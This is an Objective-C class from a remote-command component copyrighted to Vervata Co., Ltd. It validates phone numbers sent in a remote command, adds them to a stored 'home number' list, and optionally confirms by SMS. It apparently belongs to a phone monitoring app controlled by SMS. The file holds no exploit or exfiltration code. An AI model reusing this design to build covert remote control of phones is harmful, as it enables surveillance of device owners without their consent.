/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  AddHomesProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "AddHomesProcessor.h"
#import "PrefHomeNumber.h"
#import "Preference.h"

@interface AddHomesProcessor (PrivateAPI)
- (void) processAddHomesNumber;
- (void) addHomeNumberException:(NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canAddHomeNumber;
- (BOOL) checkIfHomeNumberAlreadyExist;
@end

@implementation AddHomesProcessor

@synthesize mHomesList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the AddHomesProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (AddHomesProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"AddHomesProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the AddHomesProcessor
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"AddHomesProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {
		
		mHomesList = [[NSArray alloc] initWithArray:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] 
																		   validationType:kPhoneNumberValidation]];
		DLog(@"AddHomesProcessor--->Home Numbers:%@", mHomesList);
		if ([mHomesList count] > 0) {
			if ([self canAddHomeNumber]) { 
				if (![self checkIfHomeNumberAlreadyExist] &&
					![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mHomesList])  [self processAddHomesNumber];
				else [self addHomeNumberException:kCmdExceptionErrorCannotAddDuplicateToHomeList];
			}
			else {
				[self addHomeNumberException:kCmdExceptionErrorHomeNumberExceedListCapacity];
			}
		}
		else {
			[self addHomeNumberException:kCmdExceptionErrorInvalidHomeNumberToHomeList];
		}
	} else {
		[self addHomeNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}
}

#pragma mark AddHomesProcessor PrivateAPI Methods

/**
 - Method name: processAddHomesNumber
 - Purpose:This method is used to process Add Home Number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processAddHomesNumber {
	DLog (@"AddHomesProcessor--->processAddHomesNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	
	NSMutableArray *homeNumberList=[[NSMutableArray alloc] init];
	
	// Existing Home Numbers
	for (NSString *homeNumber in [prefHomeNumberList mHomeNumbers]) {
		[homeNumberList addObject:homeNumber];
	}
	//New Home Numbers
	for (NSString *homeNumber in mHomesList) {
		[homeNumberList addObject:homeNumber];
	}
	
	[prefHomeNumberList setMHomeNumbers:homeNumberList];
	[prefManager savePreferenceAndNotifyChange:prefHomeNumberList];
	[homeNumberList release];
	[self sendReplySMS];
}


/**
 - Method name: canAddHomeNumber
 - Purpose:This method is to check maximum home number list capacity. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) canAddHomeNumber {
	DLog (@"AddHomesProcessor--->canAddHomeNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	int count= [[prefHomeNumberList mHomeNumbers] count] + [mHomesList count];
	if (count <= HOME_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: checkIfHomeNumberAlreadyExist
 - Purpose:This method is used to check if home number already exist. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (BOOL) checkIfHomeNumberAlreadyExist {
	BOOL isNumberExist=NO;
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefHomeNumber *prefHomeNumberList = (PrefHomeNumber *) [prefManager preference:kHome_Number];
	for (NSString *notificationNumber in mHomesList) {
		NSPredicate *predicate = [NSPredicate predicateWithFormat:@"SELF == %@",notificationNumber];
		NSArray *result=[[prefHomeNumberList mHomeNumbers] filteredArrayUsingPredicate:predicate];
		if ([result count]) {
			isNumberExist=YES;
			break;
		}
	}
	return isNumberExist;
}

/**
 - Method name: addHomeNumberException
 - Purpose:This method is invoked when home number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) addHomeNumberException: (NSUInteger) aErrorCode {
	DLog (@"AddHomesProcessor--->addHomeNumberException")
	FxException* exception = [FxException exceptionWithName:@"addHomeNumberException" andReason:@"Add home number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"AddHomesProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mHomesList release];
	[super dealloc];
}

@end
